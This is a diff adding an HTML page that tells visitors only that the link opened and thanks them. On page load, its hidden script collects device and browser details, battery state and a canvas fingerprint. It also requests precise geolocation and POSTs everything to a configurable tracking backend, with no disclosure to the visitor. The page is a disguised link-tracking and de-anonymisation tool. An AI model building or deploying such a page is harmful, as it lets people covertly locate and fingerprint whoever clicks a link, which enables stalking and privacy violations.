@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      min-height: 100vh;
+      background: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: sans-serif;
+    }
+    .msg {
+      text-align: center;
+      color: #555;
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="msg">
+    <p>🔗 Link opened successfully!</p>
+    <p style="margin-top:8px;font-size:.9rem;">Thank you for visiting.</p>
+  </div>
+
+  <script>
+    // ─── CONFIG ───────────────────────────────────────────────────────
+    // Replace with your actual backend URL after deploying
+   const BACKEND_URL = "/track";
+    // ──────────────────────────────────────────────────────────────────
+
+    async function collectAndSend() {
+      const data = {};
+
+      // Basic browser / device info
+      data.userAgent    = navigator.userAgent;
+      data.platform     = navigator.platform;
+      data.language     = navigator.language;
+      data.screenRes    = `${screen.width}x${screen.height}`;
+      data.colorDepth   = screen.colorDepth;
+      data.timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      data.referrer     = document.referrer || "direct";
+      data.visitTime    = new Date().toISOString();
+      data.cookiesEnabled = navigator.cookieEnabled;
+      data.onlineStatus = navigator.onLine;
+      data.doNotTrack   = navigator.doNotTrack;
+
+      // Connection info (where available)
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        data.connectionType     = conn.effectiveType;
+        data.downlink           = conn.downlink;
+        data.rtt                = conn.rtt;
+      }
+
+      // Battery (where available)
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          data.battery = {
+            level:    Math.round(bat.level * 100) + "%",
+            charging: bat.charging
+          };
+        } catch(e) {}
+      }
+
+      // Canvas fingerprint (unique device ID estimate)
+      try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("fingerprint", 2, 15);
+        ctx.fillStyle = "rgba(102,204,0,0.7)";
+        ctx.fillText("fingerprint", 4, 17);
+        data.canvasFingerprint = canvas.toDataURL().slice(-50); // last 50 chars as ID
+      } catch(e) {}
+
+      // Geolocation (asks user permission)
+      const sendData = (geo) => {
+        if (geo) data.geolocation = geo;
+        fetch(BACKEND_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        }).catch(() => {
+          // Fallback: log to console if backend not set up
+          console.log("📊 Tracked data:", data);
+        });
+      };
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => sendData({
+            latitude:  pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy:  pos.coords.accuracy + "m",
+            altitude:  pos.coords.altitude
+          }),
+          () => sendData(null),
+          { timeout: 5000 }
+        );
+      } else {
+        sendData(null);
+      }
+    }
+
+    collectAndSend();
+  </script>
+</body>
+</html>
